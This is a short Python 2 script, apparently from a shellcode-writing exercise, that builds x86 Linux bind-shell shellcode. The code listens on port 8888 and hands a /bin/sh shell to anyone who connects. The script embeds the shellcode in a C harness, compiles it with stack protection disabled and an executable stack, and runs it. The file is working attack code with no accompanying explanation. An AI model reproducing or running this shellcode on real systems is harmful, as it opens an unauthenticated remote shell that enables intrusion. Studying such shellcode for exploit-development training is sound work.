import os
import commands

'''
Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(8888)
'0x22b8'
'''
port = "\\x22\\xb8" # port 8888

shellcode = "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02" \
			"\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68" + port + "\\x66\\x6a\\x02" \
			"\\x89\\xe1\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04" \
			"\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89\\xe1\\xcd" \
			"\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\x53\\xcd\\x80\\xb0\\x3f\\xb1\\x01\\x53\\xcd" \
			"\\x80\\xb0\\x3f\\xb1\\x02\\x53\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68" \
			"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\""

f = open("shellcode.c", "w")
f.write("#include<stdio.h>\n\
#include<string.h>\n\
unsigned char code[] = \\\n\
"+ shellcode + ";\n\
main(){\n\
\tint (*ret)() = (int(*)())code;\n\
\tret();\n\
}")
f.close()

print "[*] Running the shellcode"
commands.getstatusoutput("gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode")
os.system("./shellcode")
